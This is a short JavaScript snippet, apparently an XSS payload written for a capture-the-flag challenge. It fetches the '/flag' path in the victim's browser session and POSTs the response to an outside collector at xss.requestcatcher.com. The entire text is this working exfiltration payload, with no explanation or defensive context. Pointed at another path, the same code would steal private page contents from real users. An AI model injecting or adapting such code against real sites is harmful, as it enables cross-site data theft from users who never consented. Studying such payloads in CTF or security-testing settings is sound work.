const xhr = new XMLHttpRequest();
const webhookUrl = 'https://xss.requestcatcher.com/test';

xhr.onreadystatechange = function() {
  if (xhr.readyState === XMLHttpRequest.DONE) {
    if (xhr.status === 200) {
      const responseData = xhr.responseText;

      const payload = {
        response: responseData
      };

      const payloadString = JSON.stringify(payload);

      const webhookRequest = new XMLHttpRequest();
      webhookRequest.open('POST', webhookUrl, true);
      webhookRequest.setRequestHeader('Content-Type', 'application/json');
      webhookRequest.send(payloadString);

      console.log('Webhook sent with payload:', payloadString);
    } else {
      console.error('Error: ' + xhr.status);
    }
  }
};

xhr.open('GET', '/flag');
xhr.send();
